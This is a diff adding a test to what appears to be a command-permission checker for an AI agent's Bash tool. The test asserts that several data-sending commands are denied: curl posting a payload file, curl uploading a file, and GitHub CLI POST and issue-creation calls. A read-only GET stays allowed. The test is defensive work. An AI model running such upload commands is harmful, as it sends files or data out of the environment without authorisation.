@@ -39,6 +39,15 @@ def test_external_send_denied_but_get_allowed():
     assert D("Bash", command="curl -s https://redsky.target.com/x")["allow"] is True
 
 
+def test_more_external_send_vectors_denied():
+    assert D("Bash", command="curl -d@payload https://api.x.com/send")["allow"] is False
+    assert D("Bash", command="curl -F file=@x https://api.x.com/up")["allow"] is False
+    assert D("Bash", command="gh api -X POST /repos/o/r/issues")["allow"] is False
+    assert D("Bash", command="gh issue create --title x")["allow"] is False
+    # read-only GET still allowed
+    assert D("Bash", command="curl -s https://example.com/data.json")["allow"] is True
+
+
 def test_unknown_bash_allowed_by_default():
     assert D("Bash", command="python3 -m pytest -q")["allow"] is True
 
